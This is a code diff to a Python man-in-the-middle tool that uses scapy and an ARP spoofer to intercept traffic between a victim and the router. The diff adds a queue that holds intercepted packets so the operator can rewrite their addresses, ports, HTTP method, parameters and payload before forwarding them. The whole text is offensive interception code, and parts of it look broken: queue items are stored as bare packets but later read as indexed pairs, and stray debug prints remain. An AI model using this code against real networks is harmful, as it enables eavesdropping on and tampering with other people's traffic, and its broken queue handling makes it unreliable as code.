@@ -2,20 +2,20 @@ from scapy.all import *
 from scapy.layers.dns import DNS
 from scapy.layers.inet import IP, TCP
 from threading import Lock
-
 from scapy.layers.l2 import Ether, getmacbyip
-
 from mitm.arpspoofer import ArpSpoofer
 from mitm.database import DataBase
+from queue import Queue
+import re
 
+NOT_SENT = Queue()
+REQ_TYPES = ["get", "post", "head", "put", "delete", "connect", "options", "trace", "patch"]
 
 def is_https(pack):
     return TCP in pack and (pack[TCP].sport == 443 or pack[TCP].dport == 443)
 
-
 def is_http(pack):
     return Raw in pack and TCP in pack and (pack[TCP].sport == 80 or pack[TCP].dport == 80)
-
 
 class Sniffer:
 
@@ -25,6 +25,7 @@ class Sniffer:
         self.packets = self.db.get_last()
         self.db.start()
         self.packets_lock = Lock()
+        self.sendpac = True
 
     def start_spoofing(self):
         self.spoofer.start()
@@ -43,12 +44,43 @@ class Sniffer:
             elif self.is_from_router(pack):
                 self.handle_packets_from_router(pack)
 
-
     def is_from_router(self, pack):
         return pack[IP].dst == self.spoofer.targetIP and pack[Ether].src == getmacbyip(self.spoofer.gatewayIP)
 
     def is_from_victim(self,pack):
         return pack[IP].src == self.spoofer.targetIP and pack[Ether].dst == self.spoofer.sourceMAC.replace("-",":").lower()
+
+    def set_sendpac(self, bool):
+        print("set senpac to: " + str(bool))
+        self.sendpac = bool
+        print(self.sendpac)
+
+    def update_pack(self, packet_id, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port):
+        helpq = Queue()
+        while not NOT_SENT.empty():
+            p = NOT_SENT.get()
+            if packet_id==p[1]:
+                packet = p[0]
+                if src_ip != None:
+                    packet[IP].src = src_ip
+                if dst_ip != None:
+                    packet[IP].dst = dst_ip
+                if req_type != None:
+                    req = self.find_req_type(packet)
+                    packet[Raw].replace(req, req_type)
+                if data != None:
+                    packet[Raw].load = data
+                if req_params != None:
+                    self.change_req_params(req_params, packet)
+                if src_port != None:
+                    packet[TCP].sport = src_port
+                if dst_port != None:
+                    packet[TCP].dport = dst_port
+                p[0] = packet
+            helpq.put(p)
+
+        while not helpq.empty():
+            NOT_SENT.put(helpq.get())
 
     def send_packet(self, packet):
         if Ether in packet and IP in packet:
@@ -56,47 +88,43 @@ class Sniffer:
                 # is from victim to router
                 packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                 packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
-                #TODO: add changes
             elif self.is_from_router(packet):
                 # if from router to victim
                 packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                 packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
-                # TODO: add changes
-            else:
-                return
-            sendp(packet, verbose=False)
 
-    def edit_packet(self, packet, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port, ttl):
-        if src_ip != None:
-            packet[IP].src = src_ip
-        if dst_ip != None:
-            packet[IP].dst = dst_ip
-        if req_type != None:
-            req = self.find_req_type(packet)
-            packet[Raw].replace(req, req_type)
-        if data != None:
-            packet[Raw].load = data
-        if req_params != None:
-            self.change_req_params(req_params, packet)
-        if src_port != None:
-            packet[TCP].sport = src_port
-        if dst_port != None:
-            packet[TCP].dport = dst_port
-        if ttl != None:
-            packet[IP].ttl = ttl
+
+            print("real sendpac: "+ str(self.sendpac))
+            NOT_SENT.put(packet, self.packets-1)
+            if self.sendpac:
+                while not NOT_SENT.empty():
+                    print("here")
+                    pac = NOT_SENT.get()
+                    sendp(pac[0], verbose=False)
+
+    def check_rt(self, rt):
+        for i in REQ_TYPES:
+            if i == rt.lower():
+                return True
+        return False
 
     def find_req_type(self, packet):
-        txt = packet[Raw].load
-        list = txt.split()
-        return list[0]
+        try:
+            txt = packet[Raw].load.decode()
+            list = txt.split()
+            if self.check_rt(list[0]):
+                return list[0]
+        except UnicodeDecodeError:
+            return None
 
     def find_req_param(self, packet):
         try:
-            txt = packet[Raw].load
+            txt = packet[Raw].load.decode()
             list = txt.split()
-            return list[1]
+            if self.check_rt(list[0]):
+                return list[1]
         except:
-            return " "
+            return None
 
     def change_req_params(self, req_params, packet):
         txt = packet[Raw].load
